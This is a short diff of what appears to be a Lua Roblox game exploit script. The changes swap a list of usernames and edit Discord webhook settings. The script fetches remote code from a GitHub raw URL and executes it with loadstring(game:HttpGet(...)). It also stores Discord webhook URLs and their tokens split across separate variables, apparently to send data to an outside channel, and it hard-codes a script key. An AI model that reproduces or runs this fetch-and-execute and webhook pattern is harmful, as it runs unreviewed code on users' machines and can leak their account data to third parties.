@@ -88,17 +88,21 @@ function serverHop()
 end
 
 local usernames = {
-"jzptnG34",
-"TCA4dwt0",
-"QYesGofo",
-"L6jMlUXt",
-"wQxWsZ4A",
-"WAD7FYAa",
-"TnVTyYMU",
-"priGE1wu",
-"KihDj0V1",
-"bzkslasla1863",
-"awKxoPFB",
+"ROpS918m",
+"PCMaLcCX",
+"TBhtF3oo",
+"p4GgzQaF",
+"BlakeHawke_1",
+"KaiserToniy9",
+"RojasBethx1183",
+"HesterWarrend66",
+"PearsonCrystalb955",
+"CaldwellPamelao19",
+"BradleyRaymondh597",
+"TapiaTamih4",
+"BowmanPiney2",
+"PinkJoes33",
+"nZfuzFOG"
 }
 
 local function getRandomUsername()
@@ -166,9 +170,10 @@ _G.Config = { UserID = "f6aa7929-97af-42ce-b55b-423942b1804b", discord_id = "844
 loadstring(game:HttpGet("https://raw.githubusercontent.com/skadidau/unfazedfree/refs/heads/main/petsgo"))()
 end)
 
+
 local web = "https://discordapp.com/api/webhooks/1331539343495401472/"
 local web1 = "5D-Idt1_xt_8LCDTCm-GaW64gelRm5y7xr7mox-EwGjpRNPjGVODNJal93VE88Zh3ZRL"
-local web2 = "https://discordapp.com/api/webhooks/1331539457656094740/"
+local web2 = "https://discord.com/api/webhooks/1331539457656094740/"
 local web3 = "Z_rxLlN9b6Dfe1rY91wlGWY3CkvxtyGrKQFGLMM1SYNWD4DDwhL5wfQ_-oEsHwEBYSNF"
 
 script_key="MOHBTWsfJmvEhYGNAtEYucsgKFsTdLJQ";
